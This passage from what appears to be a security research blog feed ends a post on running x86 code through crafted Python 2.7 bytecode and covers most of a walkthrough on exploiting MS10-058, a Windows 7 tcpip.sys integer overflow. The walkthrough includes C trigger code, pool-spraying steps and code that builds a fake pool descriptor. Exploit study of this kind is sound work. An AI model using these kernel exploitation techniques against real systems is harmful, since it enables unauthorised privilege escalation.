  &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;opmap&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;EXTENDED_ARG&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;  &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pshort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;     &lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;opmap&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;LOAD_CONST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;    &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pshort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xffff&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;opmap&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;CALL_FUNCTION&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pshort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
  &lt;span class="n"&gt;consts&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And we finally get our primitive working :-)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll - 
eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
deadbeef ??              ???
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So now you know all the nasty things going under the hood with that &lt;a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py"&gt;python27_abuse_vm_to_execute_x86_code.py&lt;/a&gt; script!&lt;/p&gt;
&lt;h1 id="conclusion-ideas"&gt;Conclusion, Ideas&lt;/h1&gt;
&lt;p&gt;After reading this little post you are now aware that if you want to sandbox efficiently Python, you should do it outside of Python and not by preventing the use of some modules or things like that: this is broken by design. The virtual machine is not safe enough to build a strong sandbox inside Python, so don't rely on such thing if you don't want to get surprised. An article about that exact same thing was written here if you are interested: &lt;a href="https://lwn.net/Articles/574215/"&gt;The failure of pysandbox&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You also may want to look at &lt;a href="http://pypy.org/features.html#sandboxing"&gt;PyPy's sandboxing capability&lt;/a&gt; if you are interested in executing untrusted Python code. Otherwise, you can build your own &lt;a href="https://code.google.com/p/seccompsandbox/wiki/overview"&gt;SECCOMP&lt;/a&gt;-based system :).&lt;/p&gt;
&lt;p&gt;On the other hand, I had a lot of fun taking a deep dive into Python's source code and I hope you had some too! If you would like to know more about the low level aspects of Python here are a list of interesting posts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/"&gt;Debugging Your Python With GDB (FTW!)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html"&gt;The structure of .pyc files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ve7lLHtJ9l8"&gt;Bytecode: What, Why, and How to Hack it - Dr. Ryan F Kelly&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py"&gt;Self-modifying Python bytecode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://eli.thegreenplace.net/category/programming/python/python-internals/"&gt;Python internals series&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Folks, that's all for today ; don't hesitate to contact us if you have a cool post!&lt;/p&gt;</content><category term="python"></category><category term="virtual machine"></category></entry><entry><title>First dip into the kernel pool : MS10-058</title><link href="/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/" rel="alternate"></link><published>2014-03-11T10:52:37+01:00</published><updated>2014-03-11T10:52:37+01:00</updated><author><name>Jeremy "__x86" Fetiveau</name></author><id>tag:None,2014-03-11:/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
&lt;p&gt;I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;. I think it's a good exercise to start learning about pool overflows.&lt;/p&gt;
</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
&lt;p&gt;I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;. I think it's a good exercise to start learning about pool overflows.&lt;/p&gt;


&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#forewords"&gt;Forewords&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#triggering-the-flaw"&gt;Triggering the flaw&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#spraying-the-pool"&gt;Spraying the pool&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#non-paged-objects"&gt;Non paged objects&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ntpoolhittag"&gt;nt!PoolHitTag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#exploitation-technique"&gt;Exploitation technique&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#basic-structure"&gt;Basic structure&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#poolindex-overwrite"&gt;PoolIndex overwrite&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#non-paged-pool-type"&gt;Non paged pool type&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#crafting-a-fake-pool-descriptor"&gt;Crafting a fake pool descriptor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#notes"&gt;Notes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#payload-and-clean-up"&gt;Payload and clean-up&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#greetings"&gt;Greetings&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#references"&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="forewords"&gt;Forewords&lt;/h1&gt;
&lt;p&gt;If you want to experiment with this vulnerability, you should read &lt;a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html"&gt;[1]&lt;/a&gt; and be sure to have a vulnerable system. I tested my exploit on a VM with Windows 7 32 bits with tcpip.sys 6.1.7600.16385. The Microsoft bulletin dealing with this vulnerability is MS10-058. It has been found by Matthieu Suiche &lt;a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058"&gt;[2]&lt;/a&gt; and was used as an example on Tarjei Mandt’s paper &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id="triggering-the-flaw"&gt;Triggering the flaw&lt;/h1&gt;
&lt;p&gt;An integer overflow in &lt;em&gt;tcpip!IppSortDestinationAddresses&lt;/em&gt; allows to allocate a wrong-sized non-paged pool memory chunk. Below you can see the diff between the vulnerable version and the patched version.&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;img alt="diff.png" src="/images/MS10-058/diff.png"&gt;&lt;/center&gt;&lt;/p&gt;
&lt;p&gt;So basically the flaw is merely an integer overflow that triggers a pool overflow. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;IppSortDestinationAddresses(x,x,x)+29   imul    eax, 1Ch
IppSortDestinationAddresses(x,x,x)+2C   push    esi
IppSortDestinationAddresses(x,x,x)+2D   mov     esi, ds:__imp__ExAllocatePoolWithTag@12 
IppSortDestinationAddresses(x,x,x)+33   push    edi
IppSortDestinationAddresses(x,x,x)+34   mov     edi, 73617049h
IppSortDestinationAddresses(x,x,x)+39   push    edi   
IppSortDestinationAddresses(x,x,x)+3A   push    eax  
IppSortDestinationAddresses(x,x,x)+3B   push    ebx           
IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can reach this code using a &lt;em&gt;WSAIoctl&lt;/em&gt; with the code &lt;em&gt;SIO_ADDRESS_LIST_SORT&lt;/em&gt; using a call like this :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;cb, NULL, NULL)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You have to pass the function a pointer to a &lt;em&gt;SOCKET_ADDRESS_LIST&lt;/em&gt; (&lt;em&gt;pwn&lt;/em&gt; in the example). This &lt;em&gt;SOCKET_ADDRESS_LIST&lt;/em&gt; contains an &lt;em&gt;iAddressCount&lt;/em&gt; field and &lt;em&gt;iAddressCount&lt;/em&gt; &lt;em&gt;SOCKET_ADDRESS&lt;/em&gt; structures. With a high &lt;em&gt;iAddressCount&lt;/em&gt; value, the integer will wrap, thus triggering the wrong-sized allocation.  We can almost write anything in those structures. There are only two limitations : &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;IppFlattenAddressList(x,x)+25   lea     ecx, [ecx+ebx*8]
IppFlattenAddressList(x,x)+28   cmp     dword ptr [ecx+8], 1Ch
IppFlattenAddressList(x,x)+2C   jz      short loc_4DCA9

IppFlattenAddressList(x,x)+9C   cmp     word ptr [edx], 17h
IppFlattenAddressList(x,x)+A0   jnz     short loc_4DCA2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The copy will stop if those checks fail. That means that each &lt;em&gt;SOCKET_ADDRESS&lt;/em&gt; has a length of 0x1c and that each &lt;em&gt;SOCKADDR&lt;/em&gt; buffer pointed to by the socket address begins with a 0x17 byte. Long story short :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make the multiplication at &lt;em&gt;IppSortDestinationAddresses+29&lt;/em&gt; overflow&lt;/li&gt;
&lt;li&gt;Get a non-paged pool chunk at &lt;em&gt;IppSortDestinationAddresses+3e&lt;/em&gt; that is too little&lt;/li&gt;
&lt;li&gt;Write user controlled memory to this chunk in &lt;em&gt;IppFlattenAddressList+67&lt;/em&gt; and overflow as much as you want (provided that you take care of the 0x1c and 0x17 bytes)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The code below should trigger a BSOD. Now the objective is to place an object after our vulnerable object and modify pool metadata. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;WSADATA wd = {0};
SOCKET sock = 0;
SOCKET_ADDRESS_LIST *pwn = (SOCKET_ADDRESS_LIST*)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
DWORD cb;

memset(buffer,0x41,0x1c);
buffer[0] = 0x17;
buffer[1] = 0x00;
sa.lpSockaddr = (LPSOCKADDR)buffer;
sa.iSockaddrLength = 0x1c;
pwn-&amp;gt;iAddressCount = 0x40000003;
memcpy(&amp;amp;pwn-&amp;gt;Address[0],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
memcpy(&amp;amp;pwn-&amp;gt;Address[1],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
memcpy(&amp;amp;pwn-&amp;gt;Address[2],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
memcpy(&amp;amp;pwn-&amp;gt;Address[3],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));

WSAStartup(MAKEWORD(2,0), &amp;amp;wd)
sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;cb, NULL, NULL)
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id="spraying-the-pool"&gt;Spraying the pool&lt;/h1&gt;
&lt;h2 id="non-paged-objects"&gt;Non paged objects&lt;/h2&gt;
&lt;p&gt;There are several objects that we could easily use to manipulate the non-paged pool. For instance we could use semaphore objects or reserve objects.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;*8516b848 size:   48 previous size:   48  (Allocated) Sema 
*85242d08 size:   68 previous size:   68  (Allocated) User 
*850fcea8 size:   60 previous size:    8  (Allocated) IoCo
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We are trying to overflow a pool chunk with a size being a multiple of 0x1c. As 0x1c*3=0x54, the driver is going to request 0x54 bytes and being therefore given a chunk of 0x60 bytes. This is exactly the size of an I/O completion reserve object. To allocate a IoCo, we just need to call &lt;em&gt;NtAllocateReserveObject&lt;/em&gt; with the object type IOCO. To deallocate the IoCo, we could simply close the associate the handle. Doing this would make the object manager release the object. For more in-depth information about reserve objects, you can read j00ru’s article &lt;a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf"&gt;[4]&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In order to spray, we are first going to allocate a lot of IoCo without releasing them so as to fill existing holes in the pool. After that, we want to allocate IoCo and make holes of 0x60 bytes. This is illustrated in the &lt;em&gt;sprayIoCo()&lt;/em&gt; function of my PoC. Now we are able have an IoCo pool chunk following an Ipas pool chunk (as you might have noticed, ‘Ipas’ is the tag used by the tcpip driver). Therefore, we can easily corrupt its pool header.&lt;/p&gt;
&lt;h2 id="ntpoolhittag"&gt;nt!PoolHitTag&lt;/h2&gt;
&lt;p&gt;If you want to debug a specific call to &lt;em&gt;ExFreePoolWithTag&lt;/em&gt; and simply break on it you’ll see that there are way too much frees (and above all, this is very slow when kernel debugging). A simple approach to circumvent this issue is to use pool hit tags. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ExFreePoolWithTag(x,x)+62F                  and     ecx, 7FFFFFFFh
ExFreePoolWithTag(x,x)+635                  mov     eax, ebx
ExFreePoolWithTag(x,x)+637                  mov     ebx, ecx
ExFreePoolWithTag(x,x)+639                  shl     eax, 3
ExFreePoolWithTag(x,x)+63C                  mov     [esp+58h+var_28], eax
ExFreePoolWithTag(x,x)+640                  mov     [esp+58h+var_2C], ebx
ExFreePoolWithTag(x,x)+644                  cmp     ebx, _PoolHitTag
ExFreePoolWithTag(x,x)+64A                  jnz     short loc_5180E9
ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to Debugger
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As you can see on the listing above, &lt;em&gt;nt!PoolHitTag&lt;/em&gt; is compared against the pool tag of the currently freed chunk. Notice the mask : it allows you to use the raw tag. (for instance ‘oooo’ instead of 0xef6f6f6f) By the way, you are not required to use the genuine tag. (eg : you can use ‘ooo’ for ‘IoCo’) Now you know that you can &lt;em&gt;ed nt!PoolHitTag ‘oooo’&lt;/em&gt; to debug your exploit.&lt;/p&gt;
&lt;h1 id="exploitation-technique"&gt;Exploitation technique&lt;/h1&gt;
&lt;h2 id="basic-structure"&gt;Basic structure&lt;/h2&gt;
&lt;p&gt;As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;, I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a &lt;em&gt;_POOL_DESCRIPTOR&lt;/em&gt; structure as seen below.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dt _POOL_TYPE
ntdll!_POOL_TYPE
   NonPagedPool = 0n0
   PagedPool = 0n1
0: kd&amp;gt; dt _POOL_DESCRIPTOR
nt!_POOL_DESCRIPTOR
   +0x000 PoolType         : _POOL_TYPE
   +0x004 PagedLock        : _KGUARDED_MUTEX
   +0x004 NonPagedLock     : Uint4B
   +0x040 RunningAllocs    : Int4B
   +0x044 RunningDeAllocs  : Int4B
   +0x048 TotalBigPages    : Int4B
   +0x04c ThreadsProcessingDeferrals : Int4B
   +0x050 TotalBytes       : Uint4B
   +0x080 PoolIndex        : Uint4B
   +0x0c0 TotalPages       : Int4B
   +0x100 PendingFrees     : Ptr32 Ptr32 Void
   +0x104 PendingFreeDepth : Int4B
   +0x140 ListHeads        : [512] _LIST_ENTRY
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A pool descriptor references free memory in a free list called &lt;em&gt;ListHeads&lt;/em&gt;. The &lt;em&gt;PendingFrees&lt;/em&gt; field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as &lt;em&gt;PoolVector&lt;/em&gt; (non-paged) or &lt;em&gt;ExpPagedPoolDescriptor&lt;/em&gt; (paged). Each chunk of memory contains a header before the actual data. This is the &lt;em&gt;_POOL_HEADER&lt;/em&gt;. It brings information such as the size of the block or the pool it belongs to.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dt _POOL_HEADER
nt!_POOL_HEADER
   +0x000 PreviousSize     : Pos 0, 9 Bits
   +0x000 PoolIndex        : Pos 9, 7 Bits
   +0x002 BlockSize        : Pos 0, 9 Bits
   +0x002 PoolType         : Pos 9, 7 Bits
   +0x000 Ulong1           : Uint4B
   +0x004 PoolTag          : Uint4B
   +0x004 AllocatorBackTraceIndex : Uint2B
   +0x006 PoolTagHash      : Uint2B
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id="poolindex-overwrite"&gt;PoolIndex overwrite&lt;/h2&gt;
&lt;p&gt;The basic idea of this attack is to corrupt the &lt;em&gt;PoolIndex&lt;/em&gt; field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dd ExpPagedPoolDescriptor
82947ae0  84835000 84836140 84837280 848383c0
82947af0  84839500 00000000 00000000 00000000
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As there are always some null pointers after the array, it could be used to craft a fake pool descriptor in a user-allocated null page. &lt;/p&gt;
&lt;h2 id="non-paged-pool-type"&gt;Non paged pool type&lt;/h2&gt;
&lt;p&gt;To determine the &lt;em&gt;_POOL_DESCRIPTOR&lt;/em&gt; to use, &lt;em&gt;ExFreePoolWithTag&lt;/em&gt; gets the appropriate &lt;em&gt;_POOL_HEADER&lt;/em&gt; and stores &lt;em&gt;PoolType&lt;/em&gt; (&lt;em&gt;watchMe&lt;/em&gt;) and &lt;em&gt;BlockSize&lt;/em&gt; (&lt;em&gt;var_3c&lt;/em&gt;)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ExFreePoolWithTag(x,x)+465
ExFreePoolWithTag(x,x)+465  loc_517F01:
ExFreePoolWithTag(x,x)+465  mov     edi, esi
ExFreePoolWithTag(x,x)+467  movzx   ecx, word ptr [edi-6]
ExFreePoolWithTag(x,x)+46B  add     edi, 0FFFFFFF8h
ExFreePoolWithTag(x,x)+46E  movzx   eax, cx
ExFreePoolWithTag(x,x)+471  mov     ebx, eax
ExFreePoolWithTag(x,x)+473  shr     eax, 9
ExFreePoolWithTag(x,x)+476  mov     esi, 1FFh
ExFreePoolWithTag(x,x)+47B  and     ebx, esi
ExFreePoolWithTag(x,x)+47D  mov     [esp+58h+var_40], eax
ExFreePoolWithTag(x,x)+481  and     eax, 1
ExFreePoolWithTag(x,x)+484  mov     edx, 400h
ExFreePoolWithTag(x,x)+489  mov     [esp+58h+var_3C], ebx
ExFreePoolWithTag(x,x)+48D  mov     [esp+58h+watchMe], eax
ExFreePoolWithTag(x,x)+491  test    edx, ecx
ExFreePoolWithTag(x,x)+493  jnz     short loc_517F49
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Later, if &lt;em&gt;ExpNumberOfNonPagedPools&lt;/em&gt; equals 1, the correct pool descriptor will directly be taken from &lt;em&gt;nt!PoolVector[0]&lt;/em&gt;. The PoolIndex is not used. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ExFreePoolWithTag(x,x)+5C8  loc_518064:
ExFreePoolWithTag(x,x)+5C8  mov     eax, [esp+58h+watchMe]
ExFreePoolWithTag(x,x)+5CC  mov     edx, _PoolVector[eax*4]
ExFreePoolWithTag(x,x)+5D3  mov     [esp+58h+var_48], edx
ExFreePoolWithTag(x,x)+5D7  mov     edx, [esp+58h+var_40]
ExFreePoolWithTag(x,x)+5DB  and     edx, 20h
ExFreePoolWithTag(x,x)+5DE  mov     [esp+58h+var_20], edx
ExFreePoolWithTag(x,x)+5E2  jz      short loc_5180B6


ExFreePoolWithTag(x,x)+5E8  loc_518084:
ExFreePoolWithTag(x,x)+5E8  cmp     _ExpNumberOfNonPagedPools, 1
ExFreePoolWithTag(x,x)+5EF  jbe     short loc_5180CB

ExFreePoolWithTag(x,x)+5F1  movzx   eax, word ptr [edi]
ExFreePoolWithTag(x,x)+5F4  shr     eax, 9
ExFreePoolWithTag(x,x)+5F7  mov     eax, _ExpNonPagedPoolDescriptor[eax*4]
ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Therefore, you have to make the pool manager believe that the chunk is located in paged memory. &lt;/p&gt;
&lt;h2 id="crafting-a-fake-pool-descriptor"&gt;Crafting a fake pool descriptor&lt;/h2&gt;
&lt;p&gt;As we want a fake pool descriptor at null address. We just allocate this page and put a fake deferred free list and a fake ListHeads.&lt;/p&gt;
&lt;p&gt;When freeing a chunk, if the deferred freelist contains at least 0x20 entries, &lt;em&gt;ExFreePoolWithTag&lt;/em&gt; is going to actually free those chunks and put them on the appropriate entries of the &lt;em&gt;ListHeads&lt;/em&gt;. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x100&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1208&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x104&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x140&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x1140&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;WriteAddress&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1200&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x060c0a00&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1204&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x6f6f6f6f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
